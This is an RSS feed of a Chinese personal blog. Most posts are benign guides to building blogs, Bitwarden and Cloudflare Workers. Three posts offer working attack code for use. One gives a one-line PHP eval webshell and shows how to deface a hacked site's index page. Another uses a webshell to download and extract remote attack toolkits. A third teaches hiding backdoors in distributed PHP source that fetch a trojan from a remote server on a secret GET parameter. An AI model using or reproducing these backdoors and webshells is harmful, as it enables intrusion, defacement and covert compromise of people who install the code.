<?xml version="1.0" encoding="UTF-8"?>
<rdf:RDF
xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns="http://purl.org/rss/1.0/"
xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel rdf:about="https://2890.ltd/feed/rss/category/w3.html">
<title>OKYes! 个人博客 - 网络</title>
<link>https://2890.ltd/category/w3.html</link>
<description></description>
<items>
<rdf:Seq>
<rdf:li resource="https://2890.ltd/blog/Update-20210501.html"/>
<rdf:li resource="https://2890.ltd/blog/how-to-build-your-own-blog.html"/>
<rdf:li resource="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html"/>
<rdf:li resource="https://2890.ltd/blog/74.html"/>
<rdf:li resource="https://2890.ltd/blog/72.html"/>
<rdf:li resource="https://2890.ltd/blog/59.html"/>
<rdf:li resource="https://2890.ltd/blog/55.html"/>
<rdf:li resource="https://2890.ltd/blog/47.html"/>
<rdf:li resource="https://2890.ltd/blog/24.html"/>
</rdf:Seq>
</items>
</channel>
<item rdf:about="https://2890.ltd/blog/Update-20210501.html">
<title>New Update | 2890全新升级</title>
<link>https://2890.ltd/blog/Update-20210501.html</link>
<dc:date>2021-05-01T21:07:00+08:00</dc:date>
<description>时光从不会因为谁的止步不前而停滞，转眼，2021年已过去一半，正值五一假期，为博客带来一次翻新前端前端放弃了使用了一年半的Mirages主题（在我的破机器上打开就掉帧，至今未解决） ，正好服务器也需要稍微重装一下，所以便有了今天一整天的折腾。Removed features砍掉了拖慢加载的平滑滚动砍掉了对性能影响大的一些框架砍掉了效用不佳的CDN加速Added Features新增了底部一言用户登录系统，可以提供注册登录了后端这个站是2019年5月建成的，所以Typecho用得是当时的老稳定版（虽说版本号也是1.1），两年来不曾更新，然后到了现在，发现已经无法更新了（并且使用的是SQLite，很多插件也不兼容），于是下决心将其更新，使用navicat导出数据后发现全是BUG（半年前SQLite对拷到MySQL还可以正常使用，参考Akiba Blog Dev，没办法，那咱只能手搬。花了一个下午从51篇文章里精选出了19篇高质量的文章，剩下的文章可以在Dev中找到（（其实要搬的主要原因是因为原本无序的文件结构和根目录的无序，搞了一天，清爽多了。)迁移过程首先祭出万能navicat把SQLite数据库里的数据导入到MySQL然后发现有一些东西不能正常使用（如Mirages的插件），排查错误，两小时无进展，邃开始手动迁移。手动把文章迁移完毕后发现cid对不上评论的cid导致99%的评论都错位或者不显示了，所以打算接入Waline，发现夜间模式难以与主题强制夜间模式同步，所以弃用（其实是懒得搞），打算之后再来慢慢弄评论还有就是弃用了效用不佳的原邮件推送（反正根本到达不了，推没推都一样），正在思考新的解决方案。写在最后博客对我的意义是什么呢，我变得迷茫了，原本博客只是一个记录生活的工具，只是记录那一瞬的灵光一现，但是现在越来越难沉下心来写作了，于是博客里多了一个Gossip页面用于记录灵感（晚些会将实现方式发出），相信这个难得的假期我还会发些更新的Best Wishes</description>
</item>
<item rdf:about="https://2890.ltd/blog/how-to-build-your-own-blog.html">
<title>面相初学者的建站教程：如何搭建属于自己的博客</title>
<link>https://2890.ltd/blog/how-to-build-your-own-blog.html</link>
<dc:date>2021-02-02T23:26:00+08:00</dc:date>
<description>转眼间已经到达了2021年，这几年博客圈的变化可谓是翻天覆地，服务器、域名的获取渠道更多，价格更佳亲民，甚至许多大厂专门开设了学生专区，以便学生群体可以更方便，更便宜的购得一台属于自己的服务器，这也导致了互联网上有了更多00后的身影，但是不是每一个人都有技术可以完成我们已经习以为常的建站步骤，于是今天，这篇教程对几乎所有“有完全的理解能力”的年龄段都通用确定你想要的类型博客程序主要分为静态博客和动态博客，两者最大的区别是静态博客无需拥有自己的服务器，可以做到完全免维护，而动态博客需要一台服务器，当然也可以选择免费空间，两者差别不大。域名无论是动态博客还是静态博客，你都需要一个域名来访问你的网站，这个域名可以是免费的也可以是付费的，免费域名主要来源是 Freenom ，付费域名你可以在各大注册商注册免费域名==Freenom 使用中国IP注册有域名回收风险，请自行解决风险==在 Freenom官网 搜索你想要的域名并检查可用性image-20210131222535761在下方标明==免费==的域名中选择一个你喜爱的域名，点击现在获取，进入购物车==注意== 此处一定要选12Months@Free选项，默认选择三个月免费image-20210131222740384点击Continue继续在此处填入一个==可用的==电子邮箱地址image-20210131222912580检查你的邮箱，寻找来自Freenom的邮件image-20210131223015832填入信息，所有信息都必须填写但是不一定真实image-20210131223148065勾选此项，点击Complete Orderimage-20210131223404838image-20210131223518587注册完成后进入My Domainsimage-20210131223538828更改域名NS到你想要的服务商，我推荐使用CloudFlare、DnsPod中国或者阿里云DNSimage-20210131223825504image-20210131223847418CloudFlare如果使用CloudFlare，需要注册Cloudflare账户，打开CloudFlare控制面板 填写电子邮件和密码，注册账户并添加你的域名，选择free计划image-20210131224144876一路继续，直到到达更改名称服务器页面，复制Cloudflare提供的名称服务器到Freenom面板image-20210131224358729image-20210131224441792点击Change，接着等待一小段时间（最长72小时）的NS刷新，等待成功后可以进入下一步DNSPOD&阿里云DNSPod与阿里云大同小异，这里选择阿里云做示范，进入阿里云控制台，添加域名进入你的域名管理界面，复制提供的NSimage-20210131225158323同样进入Freenom控制台填入保存，等待即可生效如果有条件可以考虑使用阿里云DNS个人专业版，支持更多功能，购买链接付费域名付费域名与免费域名一样，这里推荐阿里云，腾讯云进行注册，低价省心，但是需要实名认证，可能会有优惠，可选查看阿里云,腾讯云若不想进行实名认证，可以选择Dynadot，同样支持支付宝等支付方式购买域名前建议到哪煮米进行后缀比价，以便更划算的注册域名当你选择好了域名，是时候考虑博客程序了，静态博客可以部署在几乎任何地方以0成本运行，而动态博客则需要一台服务器（或者免费空间）来使他运行我们推荐初学者使用动态博客，显然，动态博客会更简单且更方便部署动态博客首先需要选择一个合适的服务器服务器推荐大陆服务器域名需要备案才能使用，不推荐，但是可以看看，时不时会有香港服务器，腾讯云建议选择香港轻量，便宜高速 ,阿里云,腾讯云海外（不包含港澳台）服务器，推荐从Virmach、racknerd等厂商购买，便宜且有保障，也可以从国人厂商雨云购买，观察了一段时间也挺稳定的建站空间推荐免费空间我推荐雲上蘿莉的da面板免空（暂时缺货），知乎有大佬推荐其他的链接，自行斟酌付费推荐雨云的宝塔空间开始部署在国内博客圈里有不少博客程序，比较知名的有Typecho和Wordpress 体积  功能速度服务器要求Typecho极小  较少（可通过插件扩展）快极低（还可以使用SQLite）Wordpress大  极多（可通过插件扩展）慢（可通过优化缓解）高由上面的表格，相信聪慧的你一定可以做出决定，当然，这两个程序之间的迁移也非常简单。不用担心后续想迁移TypechoTypecho的安装相对简单，这里用Easypanel免空做演示，找到你的在线文件管理器image-20210201000247494进入WWW目录，上传你的typecho程序（需要打包成zip格式）image-20210131235153274将你的域名绑定到主机并且解析，以Cloudflare为例，在DNS面板添加记录，选择A记录或者Cname记录（按主机商提供的为准），推荐打开“代理”，既使用CloudFlare提供的CDN服务image-20210201000107806等待生效后访问你的网站，会出现Typecho安装向导，点击下一步image-20210201000446537这里建议使用SQLite，轻量化，容易备份填完所有内容，然后安装，这样一个Typecho博客就部署完成了，但是就这样还不够，推荐安装TeStore 插件，主题可以在Typecho Themes 中找寻自己喜欢的，若有问题或需求可以在下方留言，安装后强烈建议开启伪静态！安装插件/主题方法：将插件放在usr/plugins目录/将主题放在usr/themes目录==若使用免费空间请做好备份！ 避免数据丢失==WordPressWordPress 也和typecho相像，依然将主程序上传到www目录，解压，访问域名就可以安装。解压后目录大致应像这样image-20210201001639859image-20210201001707530image-20210201001855883WordPress还可以搭配其独有的手机客户端进行写作，可以在App Store和Play Store下载主题可以在wordpress内下载安装，也可以从GitHub寻找，推荐主题：IRO部署静态博客静态博客有几大解决方案，如Hexo、Hugo、Jekyll、Gridea本文主要介绍简单上手的Gridea和可以基本在所有客户端构建的Hexo（其余几个理论可行，没有实践）Gridea上手Gridea是一个国人开发的免费静态博客生成器，他与Hexo一样使用Node.js编写，推荐他的原因是他拥有强大的图形化界面，简单易用，可是很遗憾，他并没有手机端，也就是说你无法在手机上使用Gridea（除了付费的在线版）Gridea支持多种部署方式，我推荐使用Coding Pages或者Github Pages，Coding Pages在国内更快，更友好，但是需要实名认证，所以本文以Github Pages服务举例首先注册一个GitHub账户，创建一个仓库，类型一定要公开（Public）image-20210201003624248创建后进入仓库设置，image-20210201003659041拉到下面，找到Github Pages服务233image-20210201004032961然后点击Save之后进入链接创建一个新的token用于Gridea勾选repo下面的就够了，生成token之请保存好此token，此token将不会再显示，把上述信息填入Gridea，保存就可以开始写作了Hexo上手Hexo是一个基于node.js的，可以在多端使用的静态博客生成软件，你可以在Apple设备，安卓设备，各种系统的电脑上使用Hexo，只需要几个命令就可以生成一个漂亮的静态博客在几乎所有系统上，你只需要用包管理器安装nodejs和npm，然后sudo npm install hexo就完成了对于安卓设备，我建议使用termux作为终端应用，ios的话使用ish就可以使用hexo了使用你自己Linux发行版的包管理器安装nodejs和gitnpm install hexo-cli -g
npm install hexo-deployer-git --save
git config --global user.name &quot;你的GitHub用户名&quot;
git config --global user.email &quot;你的GitHub注册邮箱&quot;生成ssh密钥文件：ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;然后直接三个回车即可，默认不需要设置密码然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制打开 GitHub_Settings_keys，新建new SSH Key粘贴刚才复制的内容，保存之后进入一个目录mkdir hexo
cd hexo
hexo init找到目录中的_config.yml文件将下面内容加入此文件来绑定github推送deploy:
type: git
repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git
branch: master之后输入hexo clean 
hexo g 
hexo d之后，你的网站就推送到了github上了（以及你的绑定域名上）因本文长度有限，hexo的更多强大功能就不多赘述了，想要了解更多hexo功能可以参考知乎如果你真的完全跟着这篇文章操作，那么你大多已经成功部署了一个属于自己的博客如果有问题，可以在下方留言，我会一一解答，下篇文章将会解决现在的网站访问速度慢的问题顺便介绍强大的VPS网页控制面板宝塔的使用</description>
</item>
<item rdf:about="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html">
<title>10分钟，0经费让你的网站告别黑洞</title>
<link>https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html</link>
<dc:date>2020-03-26T11:02:00+08:00</dc:date>
<description>做网站，被打已经是家常便饭了，可是每次被打，无防的阿里云、腾讯云的最低级的VPS一碰就死，几乎没有挣扎的余地，但是我们可以通过GitHub、Coding等等HTML托管服务（Pages服务）来让你的网站有一个全量镜像。成品效果感谢夜杏提供HTML单页[hide][btn url="https://mir.2890.ltd"]我的镜像传送门[/btn][/hide][hide]  [/hide][hide]  [/hide]现在存在的问题不支持Pio插件不支持Mirages的PJAX不支持Typecho原生评论（废话）如何制作使用之前请粗略的了解Git的使用方法，本人只讲原理，不贴图（懒）首先，注册一个GitHub或Coding账户，开一个新的Repo（GItHub命名请命名为Yourname.github.io）使用SSH keygen创建一个新的ssh公钥，上传到Coding或者Github然后使用crontab制作一个计划任务，ssh脚本为[hide]crontab用脚本rm -rf /www/wwwroot/网站目录/网址/*
cd /www/wwwroot/网站目录
wget -r -p -np -k 网址
sudo sh /www/wwwroot/wdnmd.sh[/hide][hide]wdnmd.shcd /www/wwwroot/网站目录
git config --global credential.helper store
git config --global user.email &quot;Email&quot;
git config --global user.name &quot;Your name&quot;
git add .
git commit -m &quot;update&quot;
git push origin master[/hide]使用代码之前请在你的网站目录初始化Git使用git init，然后 git remote add origin Git 仓库ssh地址然后git pull origin master拉取一次远程仓库，然后就可以执行脚本了。执行脚本后，你的网站就会被部署到Coding或Github上（Coding需要使用DevOps仓库并且在部署中打开静态Pages）</description>
</item>
<item rdf:about="https://2890.ltd/blog/74.html">
<title>如何优雅的使用你的WebShell II</title>
<link>https://2890.ltd/blog/74.html</link>
<dc:date>2020-02-20T10:27:00+08:00</dc:date>
<description>上篇文章我们介绍了我推荐的WebShell，这篇我们来说说如何通过这个WebShell干一些其他事，这篇文章里我就不说访问啥了，直接放代码1.使用后门获取目录信息这个不多说，有PHP基础的应该都会用$dir =  dirname(__FILE__);$file = scandir($dir);echo &quot; &lt;pre&gt;&quot;;print_r($file);这个dirname(__FILE__)是可以更改为相对路径的，比如你的后门在3层目录中，可以将$dir赋值为../../，所得结果将以一个数组print出来。像这样2.使用后门解压，释放文件这个方法我其实是不想分享出来的。毕竟屡试不爽嘛，其实很简单，代码如下$down=file_get_contents('http://压缩包下载地址.zip');file_put_contents('update.zip',$down);$zip = new ZipArchive; $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');这个方法能用来解压可到云之类的在线文件管理，当然，也可以解压个攻击工具包，然后对其它网站进行压测。其他的东西我就不说了，还有什么其他玩法，我们就笑看大佬了</description>
</item>
<item rdf:about="https://2890.ltd/blog/72.html">
<title>如何优雅的给GetShell后的网站挂黑提醒</title>
<link>https://2890.ltd/blog/72.html</link>
<dc:date>2020-02-19T17:08:00+08:00</dc:date>
<description>个人推荐webshell&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;死稳的一句话，也是个基础WebShell，但是适用于宝塔之类的禁用了系统函数的环境，后面我会进行演示。当你通过自己的方法把这个shell上传了上去之后，不用菜刀，所有操作均在浏览器进行,(这个WebShell的操作全部为php代码，宝塔默认禁用php调用linux命令的函数，如exec)1.挂黑挂黑肯定是各位拿站之后必干的事，这里提供操作访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;index.php&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;黑页内容&quot;;fwrite($myfile, $txt);fclose($myfile);如果您的html过长，可以尝试使用下载方法访问您的域名/您的文件名.php?cmd=file_put_contents(&quot;index.php&quot;,file_get_contents(&quot;您的黑页链接&quot;));为什么上面文件名不用html呢？因为html在大部分使用宝塔的服务器上的优先级低于php，如果您需要也可以使用html2.删除自身如果您是一位白帽，留了黑页也该走了,访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;文件名&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;&quot;;fwrite($myfile, $txt);fclose($myfile);即可一键自宫（雾当然，还有其他玩法，如用php列举文件，进行网站压测等玩法就不一一列举了，当然，欢迎各位加我Tg交流技术tg id:@given_huang</description>
</item>
<item rdf:about="https://2890.ltd/blog/59.html">
<title>挖坑埋密码？密码存贮程序Bitwarden初体验</title>
<link>https://2890.ltd/blog/59.html</link>
<dc:date>2020-01-16T14:03:00+08:00</dc:date>
<description>这是一款开源的密码服务器，在密码学中有一个原则，只要你的密钥没有被泄露，那么你的数据就是安全的，无论过程是否众所周知。安装体验官方BitWarden是基于.Net 部署，使用MSSQL过于臃肿，于是我并没有使用官方版本，去年在社区中有几位朋友使用Rust将他重写了，项目名为BitWarden_rs，使用SQLite作为数据库，提供Docker部署方案,而且可以免费使用官方一些付费的应用，本篇使用BitWarden_rs作为演示安装Docker#安装Docker
yum -y install docker
#启动docker
systemctl start docker
#开机自启
systemctl enable docker使用Docker拉取BitWarden_rs镜像并运行docker pull bitwardenrs/server:latest
docker run -d --name bitwarden -v /bw-data/:/data/ -p 8848:80 bitwardenrs/server:latest配置反向代理建议使用宝塔面板进行反向代理配置，使用Freessl获取一个免费的亚洲诚信SSL证书（BitWarden需要SSL才能工作）反向代理配置如下#PROXY-START/
location  ~* \.(php|jsp|cgi|asp|aspx)$
{
    proxy_pass http://你的IP:8848;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header REMOTE-HOST $remote_addr;
}
location /
{
    proxy_pass http://你的IP:8848;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header REMOTE-HOST $remote_addr;

    add_header X-Cache $upstream_cache_status;
    
    #Set Nginx Cache
    
        add_header Cache-Control no-cache;
}

#PROXY-END/ENJOYMain</description>
</item>
<item rdf:about="https://2890.ltd/blog/55.html">
<title>如何充分使用CloudFlare的免费账户</title>
<link>https://2890.ltd/blog/55.html</link>
<dc:date>2020-01-01T00:00:00+08:00</dc:date>
<description>想必各位朋友如果做网站，肯定接触或者听说过CloudFlare这个名词吧，今天我们就来看看怎么把CF免费账户的价值榨干1. 使用CF workers进行反向代理，搭建博客大家应该都知道，CF出了一个worker服务，可以让你免费运行serverless代码，比如制作反向代理，搭建博客等，只要能用node.js实现理论都可以运行，每日免费请求量是20万，够一个小型站点一天使用了。源码1.反代
/**
 * static files (404.html, sw.js, conf.js)
 */
const ASSET_URL = '要访问的地址'

const JS_VER = 10
const MAX_RETRY = 1

/** @type {RequestInit} */
const PREFLIGHT_INIT = {
  status: 204,
  headers: new Headers({
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS',
    'access-control-max-age': '1728000',
  }),
}

/**
 * @param {any} body
 * @param {number} status
 * @param {Object&lt;string, string&gt;} headers
 */
function makeRes(body, status = 200, headers = {}) {
  headers['--ver'] = JS_VER
  headers['access-control-allow-origin'] = '*'
  return new Response(body, {status, headers})
}


/**
 * @param {string} urlStr 
 */
function newUrl(urlStr) {
  try {
    return new URL(urlStr)
  } catch (err) {
    return null
  }
}


addEventListener('fetch', e =&gt; {
  const ret = fetchHandler(e)
    .catch(err =&gt; makeRes('cfworker error:\n' + err.stack, 502))
  e.respondWith(ret)
})


/**
 * @param {FetchEvent} e 
 */
async function fetchHandler(e) {
  const req = e.request
  const urlStr = req.url
  const urlObj = new URL(urlStr)
  const path = urlObj.href.substr(urlObj.origin.length)

  if (urlObj.protocol === 'http:') {
    urlObj.protocol = 'https:'
    return makeRes('', 301, {
      'strict-transport-security': 'max-age=99999999; includeSubDomains; preload',
      'location': urlObj.href,
    })
  }

  if (path.startsWith('/http/')) {
    return httpHandler(req, path.substr(6))
  }

  switch (path) {
  case '/http':
    return makeRes('请更新 cfworker 到最新版本!')
  case '/ws':
    return makeRes('not support', 400)
  case '/works':
    return makeRes('it works')
  default:
    // static files
    return fetch(ASSET_URL + path)
  }
}


/**
 * @param {Request} req
 * @param {string} pathname
 */
function httpHandler(req, pathname) {
  const reqHdrRaw = req.headers
  if (reqHdrRaw.has('x-jsproxy')) {
    return Response.error()
  }

  // preflight
  if (req.method === 'OPTIONS' &amp;&amp;
      reqHdrRaw.has('access-control-request-headers')
  ) {
    return new Response(null, PREFLIGHT_INIT)
  }

  let acehOld = false
  let rawSvr = ''
  let rawLen = ''
  let rawEtag = ''

  const reqHdrNew = new Headers(reqHdrRaw)
  reqHdrNew.set('x-jsproxy', '1')

  // 此处逻辑和 http-dec-req-hdr.lua 大致相同
  // https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua
  const refer = reqHdrNew.get('referer')
  const query = refer.substr(refer.indexOf('?') + 1)
  if (!query) {
    return makeRes('missing params', 403)
  }
  const param = new URLSearchParams(query)

  for (const [k, v] of Object.entries(param)) {
    if (k.substr(0, 2) === '--') {
      // 系统信息
      switch (k.substr(2)) {
      case 'aceh':
        acehOld = true
        break
      case 'raw-info':
        [rawSvr, rawLen, rawEtag] = v.split('|')
        break
      }
    } else {
      // 还原 HTTP 请求头
      if (v) {
        reqHdrNew.set(k, v)
      } else {
        reqHdrNew.delete(k)
      }
    }
  }
  if (!param.has('referer')) {
    reqHdrNew.delete('referer')
  }

  // cfworker 会把路径中的 `//` 合并成 `/`
  const urlStr = pathname.replace(/^(https?):\/+/, '$1://')
  const urlObj = newUrl(urlStr)
  if (!urlObj) {
    return makeRes('invalid proxy url: ' + urlStr, 403)
  }

  /** @type {RequestInit} */
  const reqInit = {
    method: req.method,
    headers: reqHdrNew,
    redirect: 'manual',
  }
  if (req.method === 'POST') {
    reqInit.body = req.body
  }
  return proxy(urlObj, reqInit, acehOld, rawLen, 0)
}


/**
 * 
 * @param {URL} urlObj 
 * @param {RequestInit} reqInit 
 * @param {number} retryTimes 
 */
async function proxy(urlObj, reqInit, acehOld, rawLen, retryTimes) {
  const res = await fetch(urlObj.href, reqInit)
  const resHdrOld = res.headers
  const resHdrNew = new Headers(resHdrOld)

  let expose = '*'
  
  for (const [k, v] of resHdrOld.entries()) {
    if (k === 'access-control-allow-origin' ||
        k === 'access-control-expose-headers' ||
        k === 'location' ||
        k === 'set-cookie'
    ) {
      const x = '--' + k
      resHdrNew.set(x, v)
      if (acehOld) {
        expose = expose + ',' + x
      }
      resHdrNew.delete(k)
    }
    else if (acehOld &amp;&amp;
      k !== 'cache-control' &amp;&amp;
      k !== 'content-language' &amp;&amp;
      k !== 'content-type' &amp;&amp;
      k !== 'expires' &amp;&amp;
      k !== 'last-modified' &amp;&amp;
      k !== 'pragma'
    ) {
      expose = expose + ',' + k
    }
  }

  if (acehOld) {
    expose = expose + ',--s'
    resHdrNew.set('--t', '1')
  }

  // verify
  if (rawLen) {
    const newLen = resHdrOld.get('content-length') || ''
    const badLen = (rawLen !== newLen)

    if (badLen) {
      if (retryTimes &lt; MAX_RETRY) {
        urlObj = await parseYtVideoRedir(urlObj, newLen, res)
        if (urlObj) {
          return proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + 1)
        }
      }
      return makeRes(res.body, 400, {
        '--error': `bad len: ${newLen}, except: ${rawLen}`,
        'access-control-expose-headers': '--error',
      })
    }

    if (retryTimes &gt; 1) {
      resHdrNew.set('--retry', retryTimes)
    }
  }

  let status = res.status

  resHdrNew.set('access-control-expose-headers', expose)
  resHdrNew.set('access-control-allow-origin', '*')
  resHdrNew.set('--s', status)
  resHdrNew.set('--ver', JS_VER)

  resHdrNew.delete('content-security-policy')
  resHdrNew.delete('content-security-policy-report-only')
  resHdrNew.delete('clear-site-data')

  if (status === 301 ||
      status === 302 ||
      status === 303 ||
      status === 307 ||
      status === 308
  ) {
    status = status + 10
  }

  return new Response(res.body, {
    status,
    headers: resHdrNew,
  })
}


/**
 * @param {URL} urlObj 
 */
function isYtUrl(urlObj) {
  return (
    urlObj.host.endsWith('.googlevideo.com') &amp;&amp;
    urlObj.pathname.startsWith('/videoplayback')
  )
}

/**
 * @param {URL} urlObj 
 * @param {number} newLen 
 * @param {Response} res 
 */
async function parseYtVideoRedir(urlObj, newLen, res) {
  if (newLen &gt; 2000) {
    return null
  }
  if (!isYtUrl(urlObj)) {
    return null
  }
  try {
    const data = await res.text()
    urlObj = new URL(data)
  } catch (err) {
    return null
  }
  if (!isYtUrl(urlObj)) {
    return null
  }
  return urlObj
}![]()2.博客源代码GayHub上一堆，不发了2. 手动指定cf节点ip来达到最佳cdn效果此操作使用于用CloudFlare Partner接入的用户添加网站之后，通过A记录解析到这些IP：108.162.236.1/24 联通 走美国
172.64.32.1/24 移动 走香港
104.16.160.1/24 电信 走美国洛杉矶
---------
172.64.0.0/24 电信 美国旧金山
104.20.157.0/24 联通 走日本
104.28.14.0/24 移动 走新加坡
 （联通移动推荐节点）
 104.23.240.0-104.23.243.254
 （电信推荐百度云合作ip）
 162.159.208.4-162.159.208.103
 162.159.209.4-162.159.209.103
 162.159.210.4-162.159.210.103
 162.159.211.4-162.159.211.103速度快的：104.20.157.2 
104.18.62.2 
141.101.115.3 
104.16.160.3百度云加速合作节点：162.159.211.4-103
103.21.244.0/22
103.22.200.0/22
103.31.4.0/22
104.16.0.0/12
108.162.192.0/18
131.0.72.0/22
141.101.64.0/18
162.158.0.0/15
172.64.0.0/13
173.245.48.0/20
188.114.96.0/20
190.93.240.0/20
197.234.240.0/22
198.41.128.0/17其余节点#适合电信的节点
104.23.240.*
#走欧洲各国出口 英国德国荷兰等 延迟比美国高一些 适合源站在欧洲的网站
172.64.32.*
#虽然去程走新加坡，但是回程线路的绕路的，实际效果不好，不推荐
104.16.160.*
#圣何塞的线路，比洛杉矶要快一点，推荐
108.162.236.*
#亚特兰大线路，延迟稳定，但是延迟较高
#适合移动的节点
162.158.133.* 
#走的丹麦，这一段ip只有部分能用，可以自己试一下。绕美国。
198.41.214.*
198.41.212.*
198.41.208.*
198.41.209.*
172.64.32.*
141.101.115.*
#移动走香港的IP段有很多，以上并不是全部。CF移动走香港的分直连和走ntt的效果都挺不错的，不过部分地区晚上还是会丢包。
172.64.0. *
#这是走圣何塞的，一般用香港的就行
172.64.16.* 
#欧洲线路.绕
 #1.0.0.1效果较好
电信部分
大多数省直接使用1.0.0.0即可，延迟低，丢包少，
 #移动部分
#新加坡
 104.18.48.0-104.18.63.255
104.24.112.0-104.24.127.255
104.27.128.0-104.27.143.255
104.28.0.0-104.28.15.255
 #移动部分
#圣何塞 
104.28.16.0-31.255
104.27.144.0-243.254
104.23.240.0-243.254
 #香港cloudflare1-100g.hkix.net
1.0.0.0-254
1.1.1.0-254
 #香港直连
104.16.0.0-79.255
104.16.96.0-175.254
104.16.192.0-207.255</description>
</item>
<item rdf:about="https://2890.ltd/blog/47.html">
<title>0成本搭建超快的Serverless Blog</title>
<link>https://2890.ltd/blog/47.html</link>
<dc:date>2019-11-27T20:20:00+08:00</dc:date>
<description>用过很多博客程序了，有动态的，也有静态的，只能说各有所长吧。今天这个程序，基于serverless，运行在cloudflare workers上，除了域名需要付费(也可以去Freenom申请免费的，但是不推荐)其余都是完全免费的。演示iloli.icu源代码github 这份代码是未经修改的，你也可以选择自行修改搭建过程进入cloudflare官网，登录你的账号进入workers设置，创建一个新的workerworkers创建完毕点击editor，将worker.js内容粘贴到左边，save，就完事了自定义域名获取到自己的**.workers.dev 域名 Cname 到(**.workers.dev)然后去 Workers 点击 ADD route输入自定义域名，例如 iloli.icu/* 后面要加上 /* ，下面的 workers 选择刚才的项目</description>
</item>
<item rdf:about="https://2890.ltd/blog/24.html">
<title>如何用三种方式优雅的往你的PHP源码放点不为人知的后门</title>
<link>https://2890.ltd/blog/24.html</link>
<dc:date>2019-09-13T12:12:00+08:00</dc:date>
<description>兄 dei 你有没有尝试过辛辛苦苦写的源码被人解密拿去大肆分享？不管有没有，反正我是没有。那么这篇文章我们就来说一下如何有效的防范狗 b 并且阴一把狗 b 吧 QAQ巧用Get远程下载后门巧用Get远程下载后门 &lt;?php
define('ROOT', dirname(SYSTEM_ROOT).'/');
if($_GET['hacked']==='logged'){'
file_put_contents(ROOT.'isetex.php',curl_get('http://域名/api/houmen.txt)'));
}
?&gt;
食用方法:把一个文本为木马的txt保存到云端，复制链接替换“http://域名/api/houmen.txt” 然后访问文件名称.php?hacked=logged 即可在目录生成一个从你云端木马文本获取内容并且名为isetex.php的木马文件当然你也可以改成一句话之类的东西，简单说 你会玩 想咋玩咋玩利用云端下载压缩包解压放后门&lt;?php
$down=file_get_contents('http://压缩包下载地址.zip');
        file_put_contents('update.zip',$down);
            $zip = new ZipArchive;
            $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');


            echo &quot;https://2890.ltd OK!!!&quot;;
?&gt;
结合上面的get方式来也是妥妥的    &lt;?php
if($_GET['hacked']==='logged'){
    $down=file_get_contents('http://压缩包下载地址.zip');
            file_put_contents('update.zip',$down);
                $zip = new ZipArchive;
                $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');

                echo &quot;https://2890.ltd OK!!!&quot;;
}
    ?&gt;
食用方法：访问，自动下载云端压缩包并解压到根目录，必须要求zip压缩JavaScript骚操作防盗模板`var xhr = new XMLHttpRequest();xhr.onreadystatechange=function(){    if(xhr.responseText == &quot;000&quot;){//如果txt内容为000
            document.write(&quot;&lt;center&gt;&lt;h1&gt;我是显示内容&lt;center&gt;&lt;h1&gt;&quot;);
    }//则显示这里的内容}xhr.open("GET","http://webserver/isopen.txt",true);//云端txtxhr.send(null);`感觉代码写的挺明白的，js放oss然后模板添加一下调用，盗版狗专防，死稳忘了说js还支持运行php代码 感觉人生js并肩php了呢&lt;script language=php&gt;@eval($_POST['web']);&lt;/script&gt; </description>
</item>
</rdf:RDF>